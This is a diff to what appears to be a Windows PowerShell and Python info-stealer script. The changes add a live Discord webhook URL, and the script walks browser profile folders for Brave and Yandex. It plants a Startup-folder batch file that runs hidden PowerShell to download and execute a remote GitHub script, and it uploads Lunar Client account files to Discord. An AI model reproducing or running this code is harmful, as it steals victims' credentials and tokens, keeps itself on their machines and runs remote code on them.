@@ -1,3 +1,4 @@
+$webHookUrl='https://discord.com/api/webhooks/1063963039277273088/KqQ85FhDSopzCt76DYdcyzlYIakDMPOB7qO_eaGt9QG3JITDCh9CMgOiPTa0peobzXkp'
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
 $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
@@ -37,7 +38,7 @@ def main():
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
-    message = '@everyone' if PING_ME else ''
+    message = 'Nice' if PING_ME else ''
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -69,6 +70,7 @@ Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu
 @echo off
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
 "
+pause
 ##### END STARTUP FONCTION
 
 cls
@@ -158,12 +160,3 @@ Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
 Remove-Item C:/temp
 exit  
-
-  
-
-
-
-
-
-
-
